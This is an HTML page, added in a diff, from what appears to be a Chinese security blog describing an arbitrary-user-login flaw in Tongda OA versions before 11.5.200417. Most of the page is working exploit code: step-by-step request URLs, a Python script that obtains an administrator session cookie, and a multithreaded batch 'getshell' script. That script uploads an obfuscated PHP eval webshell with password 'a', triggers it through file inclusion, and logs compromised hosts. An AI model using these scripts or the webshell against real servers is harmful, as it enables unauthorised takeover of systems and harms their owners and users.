@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="通达OA &lt; 11.5.200417 任意用户登录漏洞一、漏洞简介未经授权的攻击者可以通过构造进行任意用户登录（包括admin），登录之后可进一步上传恶意文件控制网站服务器。 二、漏洞影响通达OA &lt; 11.5.200417版本 三、复现过程第一种利用方法 第一步：拿到uid  http:&#x2F;&#x2F;www.0-sec.org&#x2F;general&#x2F;login_code.php http:&#x2F;&#x2F;www">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEOA%20_%2011.5.200417%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="通达OA &lt; 11.5.200417 任意用户登录漏洞一、漏洞简介未经授权的攻击者可以通过构造进行任意用户登录（包括admin），登录之后可进一步上传恶意文件控制网站服务器。 二、漏洞影响通达OA &lt; 11.5.200417版本 三、复现过程第一种利用方法 第一步：拿到uid  http:&#x2F;&#x2F;www.0-sec.org&#x2F;general&#x2F;login_code.php http:&#x2F;&#x2F;www">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId30.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId32.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId34.png">
+<meta property="article:published_time" content="2022-07-08T06:26:11.092Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.296Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-通达oa/通达OA _ 11.5.200417 任意用户登录漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEOA%20_%2011.5.200417%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.092Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="通达OA-lt-11-5-200417-任意用户登录漏洞"><a href="#通达OA-lt-11-5-200417-任意用户登录漏洞" class="headerlink" title="通达OA &lt; 11.5.200417 任意用户登录漏洞"></a>通达OA &lt; 11.5.200417 任意用户登录漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>未经授权的攻击者可以通过构造进行任意用户登录（包括admin），登录之后可进一步上传恶意文件控制网站服务器。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>通达OA &lt; 11.5.200417版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="第一种利用方法"><a href="#第一种利用方法" class="headerlink" title="第一种利用方法"></a>第一种利用方法</h3><blockquote>
+<p>第一步：拿到uid</p>
+</blockquote>
+<pre><code>http://www.0-sec.org/general/login_code.php
+http://www.0-sec.org/ispirit/login_code.php
+</code></pre>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<blockquote>
+<p>第二步：拿到cookie</p>
+</blockquote>
+<pre><code>http://www.0-sec.org/logincheck_code.php
+</code></pre>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<blockquote>
+<p>第三步：</p>
+</blockquote>
+<pre><code>http://www.0-sec.org/general/index.php?is_modify_pwd=1
+</code></pre>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<h3 id="第二种利用方法"><a href="#第二种利用方法" class="headerlink" title="第二种利用方法"></a>第二种利用方法</h3><blockquote>
+<p>第一步：</p>
+</blockquote>
+<pre><code>http://www.0-sec.org/ispirit/login_code.php
+</code></pre>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<blockquote>
+<p>第二步：</p>
+</blockquote>
+<pre><code>http://www.0-sec.org/general/login_code_scan.php
+</code></pre>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
+<blockquote>
+<p>第三步：</p>
+</blockquote>
+<pre><code>http://www.0-sec.org/ispirit/login_code_check.php?codeuid=&#123;EED2B9FE-F865-DCF1-0E8D-3326AE163F6D&#125;
+</code></pre>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
+<blockquote>
+<p>第四步：</p>
+</blockquote>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
+<h3 id="获取cookie-poc"><a href="#获取cookie-poc" class="headerlink" title="获取cookie poc"></a>获取cookie poc</h3><pre><code>import requests
+import argparse
+import random
+import warnings
+import sys
+import re
+
+class Tond_da_poc():
+    def __init__(self,url):
+        self.url = url+&#39;/&#39;
+        self.user_agent =USER_AGENTS = [
+    &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;,
+    &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;,
+    &quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;,
+    &quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;,
+    &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;,
+    &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;,
+    &quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;,
+    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;,
+    &quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;,
+    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;,
+    &quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;,
+    &quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;,
+    &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;,
+    &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;,
+    &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;,
+    &quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;,
+    &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&quot;,
+    &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&quot;,
+    &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;,
+    &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;,
+    &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER&quot;,
+    &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;,
+    &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)&quot;,
+    &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;,
+    &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;,
+    &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;,
+    &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;,
+    &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;,
+    &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;,
+    &quot;Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5&quot;,
+    &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre&quot;,
+    &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0&quot;,
+    &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;,
+    &quot;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&quot;
+]
+        self.payload_url_uid = &#39;/general/login_code.php&#39;
+        self.payload_url_cookie = &#39;/logincheck_code.php&#39;
+        self.headers= &#123;&#39;headers&#39;:random.choice(self.user_agent)&#125;
+        self.vulhub = False
+
+
+
+    def get_tongda_uid(self):
+        url =self.url+self.payload_url_uid
+
+        r = requests.get(url=url,headers=self.headers,verify=False).text
+        print(&#39;[*] Checking current URL UID&#39; )
+        uid_txt =r.split(&#39;code_uid&#39;)
+        uid_compile = re.compile(r&#39;&quot;(&#123;.*&#125;)&quot;&#39;)
+        try:
+            get_uid = re.findall(uid_compile,r)
+            if len(get_uid) &gt; 0:
+                print(&#39;【+】 Get current uid successfully&#39;,get_uid[0])
+                self.vulhub = True
+                return get_uid
+            else:
+                print(&#39;[-] Failed to get current UID&#39;)
+
+        except Exception as error:
+            pass
+
+    def get_tongda_cookies(self):
+        url =self.url +self.payload_url_cookie
+        data = &#123;&#39;CODEUID&#39;:self.get_tongda_uid(),&#39;UID&#39;:1&#125;
+        r =requests.post(url,data=data,headers =self.headers,verify=False)
+        try:
+            if r.headers[&#39;Set-Cookie&#39;] != None and self.vulhub != False:
+               tongda_cookie =r.headers[&#39;Set-Cookie&#39;]
+               print(&#39;【+】 Get session of current URL successfully&#39;,tongda_cookie)
+
+            else:
+                print(&#39;[-] Failed to get session of current URL&#39;)
+
+        except Exception as error:
+            pass
+
+
+
+
+
+
+
+    def run(self):
+        self.get_tongda_cookies()
+
+
+
+if __name__ == &#39;__main__&#39;:
+
+    # Author  : 小泫
+
+    warnings.simplefilter(&quot;ignore&quot;)
+    if (len(sys.argv)) &lt; 2:
+        print(&#39;useage : python&#39; +str(sys.argv[0]) + &#39; -h&#39;)
+    else:
+        parser =argparse.ArgumentParser()
+        parser.description =&#39;通达OA &lt; 11.5版本 任意用户登录&#39;
+        parser.add_argument(&#39;-u&#39;,help=&quot;待检测url -&gt; example http://127.0.0.1&quot;,type=str,dest=&#39;check_url&#39;)
+        args =parser.parse_args()
+
+        aa = Tond_da_poc(args.check_url)
+        aa.run()
+</code></pre>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEOA%3C11.5.200417%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/media/rId34.png"></p>
+<h3 id="getshell-poc"><a href="#getshell-poc" class="headerlink" title="getshell poc"></a>getshell poc</h3><blockquote>
+<p>url.txt： 测试url，支持批量</p>
+<p>vuln.txt：上传成功的webshell</p>
+<p>上传的默认一句话shell密码a</p>
+</blockquote>
+<pre><code># Usage: python tongda.py
+# Default webshell password:a
+
+import requests
+import threadpool
+import urllib3
+import json
+import base64
+
+urllib3.disable_warnings()
+header = &#123;
+    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;,
+    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,
+    &quot;Referer&quot;: &quot;https://google.com&quot;,
+&#125;
+proxy = &#123;       # debug
+    &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;,
+    &quot;https&quot;: &quot;http://127.0.0.1:8080&quot;
+&#125;
+
+
+def wirte_targets(vurl, filename):
+    with open(filename, &quot;a+&quot;) as f:
+        f.write(vurl + &quot;\n&quot;)
+        return vurl
+
+
+def get_cookie(url):
+    checkHeader = &#123;
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;,
+        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,
+        &quot;Referer&quot;: &quot;https://google.com&quot;,
+    &#125;
+    try:
+        req1 = requests.get(url + &quot;/ispirit/login_code.php&quot;, headers=checkHeader, verify=False, timeout=25)
+        if req1.status_code == 200 and &quot;codeuid&quot; in req1.text: 
+            codeUid = json.loads(req1.text)[&quot;codeuid&quot;]
+        else:
+            req1 = requests.get(url + &quot;/general/login_code.php&quot;, headers=checkHeader, verify=False, timeout=25)
+            status = req1.text.find(&#39;&#123;&quot;status&quot;:1&#39;)
+            if req1.status_code == 200 and status != -1:
+                codeUid = json.loads(req1.text[status:])[&quot;code_uid&quot;]
+            else:
+                return &quot;123&quot;
+        req2 = requests.post(url+ &quot;/general/login_code_scan.php&quot;, data=&#123;&quot;codeuid&quot;: codeUid, &quot;uid&quot;: int(1), &quot;source&quot;: &quot;pc&quot;, &quot;type&quot;: &quot;confirm&quot;, &quot;username&quot;: &quot;admin&quot;&#125;, headers=checkHeader, verify=False, timeout=25)
+        if req2.status_code == 200 and json.loads(req2.text)[&quot;status&quot;] == &quot;1&quot;:
+            req3 = requests.get(url + &quot;/ispirit/login_code_check.php?codeuid=&quot; + codeUid, headers=checkHeader, verify=False, timeout=25)
+            if req3.status_code == 200 and &#39;&quot;uid&quot;:&quot;1&quot;&#39; in req3.text:
+                cookie = req3.headers[&quot;Set-Cookie&quot;]
+                return cookie
+    except:
+        pass
+    return &quot;123&quot;
+
+
+def exp(u):
+    uploadHeader = &#123;
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;,
+        &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----fuck123&quot;,
+        &quot;Referer&quot;: &quot;https://google.com&quot;,
+    &#125;
+    shellName = &quot;templates.php&quot;
+    tongdaDir = &quot;/&quot;
+    uploadFlag = &quot;upload jpg shell&quot;
+    shellFlag = &quot;sucess !!&quot;
+    webPath = tongdaDir + shellName
+    printFlag = &quot;&quot;
+
+    cookie = get_cookie(u)
+    if cookie != &quot;123&quot;:
+        printFlag = &quot;[Login]：&quot; + u + &quot;/general/index.php\t&quot; + cookie + &quot;\n&quot;
+    header[&quot;Cookie&quot;] = cookie
+
+    # password:a
+    # POST method
+    # base64.decode: &lt;?php $a=&quot;~+d()&quot;^&quot;!&#123;+&#123;&#125;&quot;;$b=$&#123;$a&#125;[&quot;a&quot;];eval(&quot;&quot;.$b);echo &quot;sucess !!&quot;;?&gt;
+    b64Shell = &quot;PD9waHAgJGE9In4rZCgpIl4iIXsre30iOyRiPSR7JGF9WyJhIl07ZXZhbCgiIi4kYik7ZWNobyAi&quot; + base64.b64encode(shellFlag.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;) + &quot;Ijs/Pg==&quot;
+    
+    uploadData = &quot;------fuck123\r\nContent-Disposition: form-data; name=\&quot;UPLOAD_MODE\&quot;\r\n\r\n1\r\n------fuck123\r\nContent-Disposition: form-data; name=\&quot;P\&quot;\r\n\r\n&quot; + cookie[cookie.find(&quot;=&quot;)+1:cookie.find(&quot;;&quot;)] + &quot;\r\n------fuck123\r\nContent-Disposition: form-data; name=\&quot;DEST_UID\&quot;\r\n\r\n1\r\n------fuck123\r\nContent-Disposition: form-data; name=\&quot;ATTACHMENT\&quot;; filename=\&quot;jpg\&quot;\r\nContent-Type: image/jpeg\r\n\r\n&lt;?php\r\nfile_put_contents($_SERVER[\&quot;DOCUMENT_ROOT\&quot;].\&quot;/&quot; + webPath + &quot;\&quot;, base64_decode(&#39;&quot; + b64Shell + &quot;&#39;));\r\necho \&quot;&quot; + uploadFlag + &quot;\&quot;;\r\n?&gt;\r\n------fuck123--&quot;
+    try:
+        uploadHeader[&quot;Cookie&quot;] = cookie
+        req1 = requests.post(u + &quot;/ispirit/im/upload.php&quot;, headers=uploadHeader, verify=False, data=uploadData, timeout=25)
+        text = req1.text
+        if req1.status_code == 200 and &quot;[vm]&quot; in text:
+            uploadFilePath = text[text.find(&quot;@&quot;)+1:text.find(&quot;|&quot;)].replace(&quot;_&quot;, &quot;/&quot;)
+            includeData = &#39;json=&#123;&quot;url&quot;:&quot;/general/../../attach/im/&#39; + uploadFilePath + &#39;.jpg&quot;&#125;&#39;
+            req2 = requests.post(u + &quot;/mac/gateway.php&quot;, headers=header, verify=False, data=includeData, timeout=25)
+            if req2.status_code == 404 or uploadFlag not in req2.text:
+                req2 = requests.post(u + &quot;/ispirit/interface/gateway.php&quot;, headers=header, verify=False, data=includeData, timeout=25)
+            if req2.status_code == 200 and uploadFlag in req2.text:
+                shellPath = u + webPath
+                req3 = requests.get(shellPath, headers=header, verify=False, timeout=25)
+                if shellFlag in req3.text:
+                    printFlag = &quot;[Getshell]：&quot; + shellPath + &quot;\t&quot; + cookie + &quot;\n&quot;
+                    wirte_targets(shellPath, &quot;vuln.txt&quot;)
+    except:
+        pass
+    print(printFlag, end=&quot;&quot;)
+
+
+def multithreading(funcname, filename=&quot;url.txt&quot;, pools=5):
+    works = []
+    with open(filename, &quot;r&quot;) as f:
+        for i in f:
+            func_params = [i.rstrip(&quot;\n&quot;)]
+            works.append((func_params, None))
+    pool = threadpool.ThreadPool(pools)
+    reqs = threadpool.makeRequests(funcname, works)
+    [pool.putRequest(req) for req in reqs]
+    pool.wait()
+
+
+if __name__ == &quot;__main__&quot;:
+    multithreading(exp, &quot;url.txt&quot;, 8)      # Default threads 8
+
+# Usage: python tongda.py
+# Default webshell password:a
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/xiaoxuan-3vnio/nucw6f/wbqg8f">https://www.yuque.com/xiaoxuan-3vnio/nucw6f/wbqg8f</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/clm123321/tongda/_oa/_rce/blob/master/tongda.py">https://github.com/clm123321/tongda\_oa\_rce/blob/master/tongda.py</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEOA%20_%2011.5.200417%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r1cq00r0y8v12zis7vd5" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E2%BB%9A%E9%9D%A2%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%EF%A4%B8/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20xss/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
